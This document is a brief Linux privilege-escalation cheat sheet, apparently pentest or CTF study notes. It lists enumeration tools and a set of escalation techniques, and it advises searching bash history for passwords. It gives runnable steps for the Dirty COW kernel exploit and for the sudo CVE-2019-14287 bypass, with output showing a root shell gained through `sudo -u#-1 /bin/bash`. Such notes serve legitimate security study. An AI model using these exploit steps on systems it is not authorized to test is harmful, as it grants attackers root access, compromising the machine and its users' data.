# Privilege Escalation Tips for Linux

## Automated Tools
1. LinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
2. LinEnum - https://github.com/rebootuser/LinEnum 
3. Linux Exploit Suggester - https://github.com/mzet-/linux-exploit-suggester 
4. Linuxprivcheck.py - https://github.com/sleventyeleven/linuxprivchecker 

## Summary of Possible Linux Priv Esc
1. Kernel Exploits
2. Escalation via Stored Passwords
3. Escalation via Weak File Permissions
4. Escalation via SSH Keys
5. Escalation via Sudo Shell Escaping i.e. `sudo -l`
6. Escalation via Intended Functionality e.g. apache2
7. Escalation via LD_PRELOAD
8. Escalation via Sudo Security Bypass 

## Tips

Check the bash history - `history`
- there may be useful commands being run by the user
- may contain passwords

## Kernel Exploit

### Dirty Cow
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) 

Exploit DB - https://www.exploit-db.com/exploits/40839

#### Usage
```bash
gcc -pthread c0w.c -o cow  
./cow  
passwd
```  

### sudo 1.8.27 - Security Bypass (CVE-2019-14287)

```bash

sudo -l

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash

```
To exploit, run the following,

```
hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
```

More info at https://www.exploit-db.com/exploits/47502 

